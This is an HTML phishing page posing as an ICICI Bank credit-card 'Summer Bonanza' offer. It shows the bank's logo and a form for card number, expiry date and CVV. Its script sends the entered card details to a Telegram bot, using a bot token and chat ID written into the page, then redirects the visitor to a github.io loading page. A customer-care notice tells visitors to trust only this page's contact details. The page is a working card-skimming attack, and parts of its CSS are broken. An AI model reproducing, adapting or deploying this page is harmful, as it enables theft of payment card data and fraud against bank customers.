<!DOCTYPE html>
<html>
<head>

  <style>
    body {

    }

      display: flex;
      justify-content: space-between;

 .banner {

<body>
  <div class="title-box">
    <h1 style="text-transform: uppercase;">ICICI-CRADIT-CARD</h1>
  </div>
  <div class="banner">
  <div class="icon"></div>
  <div class="text">Avail exciting offers from Summer Bonanza! TnC apply</div>
  <div class="arrow"></div>
</div>


  <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/ICICI_Bank_Logo.svg" alt="ICICI Bank Logo" class="logo">
  <div class="outer-box">
  


   <div class="text-editor-box">
      <form id="creditCardForm">
        <label for="cardNumber">Card Number:</label>
        <input type="text" id="cardNumber" name="cardNumber" required placeholder="xxxx-xxxx-xxxx-xxxx">
        <div class="lower-inputs">
          <div class="input-field">
            <label for="expiryDate">Expiry Date:</label>
            <input type="text" id="expiryDate" name="expiryDate" required placeholder="MM/YY">
          </div>
          <div class="input-field">
            <label for="cuu">cvv:</label>
            <input type="number" id="cuu" name="cuu" required placeholder="000">
          </div>
        </div>
        <button type="submit" class="submit-button">Submit</button>
      </form>
    </div>
  </div>
  <div class="customer-care">
  <h2>Contact Customer Care</h2>
  <p>To contact ICICI Bankâ€™s Customer Care, use the contact details updated here.</p>
  <p>Please do not use the contact details updated on any other.</p>
</div>


  <script>
    document.getElementById('creditCardForm').addEventListener('submit', function(event) {
      event.preventDefault();
      var cardNumber = document.getElementById('cardNumber').value;
      var expiryDate = document.getElementById('expiryDate').value;
      var cuu = document.getElementById('cuu').value;

      // WARNING: Exposing your Telegram bot token in client-side code is insecure
      var botToken = '6907376918:AAG4hGD6WZtRYrCLWjZkmj21Qn0bmelNLfo'; // Replace with your actual bot token
      var chatId = '6594647868'; // Replace with your actual chat ID
      var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

      var message = `Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCUU: ${cuu}`;

      fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          window.location.href = 'https://vipin7033.github.io/loding/';
        } else {
          alert('Failed to send the message to the Telegram bot.');
        }
      })
      .catch((error) => {
        console.error('Error:', error);
        alert('An error occurred while sending the message.');
      });
    });
  </script>
